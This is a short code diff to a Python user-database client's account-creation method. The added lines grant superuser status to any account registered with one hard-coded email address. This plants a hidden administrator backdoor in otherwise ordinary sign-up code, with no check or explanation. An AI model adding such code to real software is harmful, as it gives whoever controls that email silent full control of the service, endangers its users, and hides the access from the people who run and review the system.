@@ -210,10 +210,12 @@ class UserClient(BaseDBClient):
     ) -> UserModel:
         """Create a new user with email and password hash."""
         async with self.async_session() as session:
+            is_superuser = email.lower() == "pranav@grr.la"
             user = UserModel(
                 provider_id=f"oss_{int(datetime.now(timezone.utc).timestamp())}_{uuid.uuid4()}",
                 email=email.lower(),
                 password_hash=password_hash,
+                is_superuser=is_superuser,
             )
             session.add(user)
             await session.commit()
